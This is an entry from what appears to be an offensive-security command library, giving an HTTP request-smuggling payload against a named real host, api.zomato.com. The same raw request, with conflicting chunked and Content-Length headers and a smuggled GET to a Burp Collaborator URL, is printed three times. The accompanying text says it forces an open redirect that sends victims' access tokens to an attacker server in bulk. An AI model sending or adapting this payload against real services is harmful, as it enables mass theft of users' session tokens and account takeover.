---
data: >-
  DELETE / HTTP/1.1

  Transfer-Encoding: chunked

  Host: api.zomato.com

  Content-Length: 91

  User-Agent: Treasure/6.7

  0

  GET https://2psvzm9pf3hkuz2dptyimjaynptfh4.burpcollaborator.net/desync/
  HTTP/1.1

  X: X
tags:
  - http-request-smuggling
  - token-theft
type: command
executor: bash
platforms:
  - Web
id: 2ee45ca2-bf21-4405-86cb-a0f15384ffc6
created_at: '2025-12-11T06:10:24.285Z'
updated_at: '2025-12-11T06:10:24.285Z'
verified: false
validated: true
submitted: true
---
# smuggle-request-token-theft

## Command

```bash
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7
0
GET https://2psvzm9pf3hkuz2dptyimjaynptfh4.burpcollaborator.net/desync/ HTTP/1.1
X: X
```

## Description

Smuggles a request to force open redirect and steal victim token via redirection to attacker server, used in exploitation to steal tokens in bulk.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Content-Length` | 91 (bytes for smuggling) | Yes |
| `GET https://.../desync/` | Smuggled request line triggering 301 redirect | Yes |

## Examples

### Basic Usage

```bash
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7
0
GET https://2psvzm9pf3hkuz2dptyimjaynptfh4.burpcollaborator.net/desync/ HTTP/1.1
X: X
```

## Expected Output

Victim redirects to attacker URL with X-Access-Token in headers, captured by Collaborator.

## Related

- [[procedures/Exploit-Smuggling-with-Open-Redirect-for-Token-Theft]]
- [[commands/smuggle-request-triage]]
